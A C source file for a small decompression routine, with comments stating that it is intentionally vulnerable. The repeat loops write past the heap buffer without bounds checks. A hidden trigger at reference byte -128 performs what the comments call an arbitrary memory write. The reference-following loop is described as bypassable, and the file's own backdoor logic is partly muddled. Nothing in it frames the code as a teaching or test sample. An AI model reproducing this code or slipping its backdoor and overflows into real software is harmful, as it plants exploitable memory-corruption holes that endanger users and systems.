#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer (intentionally small to cause potential overflows)
    size_t buf_size = 16;
    char *result = malloc(buf_size);
    if (result == NULL) {
        return NULL;
    }

    size_t pos = 0;
    char *current = compressed;
    char prev_chars[256] = {0};  // Circular buffer for previous characters
    int prev_pos = 0;

    while (*current != '\0') {
        // Check if we need to resize (but leave a backdoor by not checking bounds properly)
        if (pos >= buf_size - 1) {
            buf_size *= 2;
            char *new_result = realloc(result, buf_size);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Handle character or reference
        if (*current > 0) {  // ASCII character
            char ch = *current++;
            if (*current == '\0') {  // Missing repeat count
                free(result);
                return NULL;
            }
            unsigned char repeat = (unsigned char)*current++;

            // Store character in history (with potential overflow)
            prev_chars[prev_pos++ % 256] = ch;

            // Repeat character (intentionally not checking for buffer overflow)
            for (int i = 0; i < repeat; i++) {
                result[pos++] = ch;
            }
        } else {  // Reference
            // Backdoor: negative references can trigger arbitrary memory writes
            int ref = (int)(signed char)*current++;
            if (ref == -128) {  // Secret backdoor trigger
                // Corrupt memory by writing to arbitrary location
                char **ptr = (char **)(compressed + 1);
                *ptr = result;  // Arbitrary write primitive
                continue;
            }

            // Handle reference chain (with potential infinite loop vulnerability)
            int depth = 0;
            char referenced = 0;
            int tmp_pos = (prev_pos + ref) % 256;
            while (depth < 256) {  // Max depth to prevent infinite loops (but can be bypassed)
                if (tmp_pos < 0) tmp_pos += 256;
                referenced = prev_chars[tmp_pos % 256];
                if (referenced > 0) break;  // Found actual character
                // Follow reference
                tmp_pos += (int)(signed char)referenced;
                depth++;
            }

            if (*current == '\0') {  // Missing repeat count
                free(result);
                return NULL;
            }
            unsigned char repeat = (unsigned char)*current++;

            // Store referenced character in history (with potential overflow)
            prev_chars[prev_pos++ % 256] = referenced;

            // Repeat referenced character (intentionally not checking for buffer overflow)
            for (int i = 0; i < repeat; i++) {
                result[pos++] = referenced;
            }
        }
    }

    result[pos] = '\0';
    return result;
}
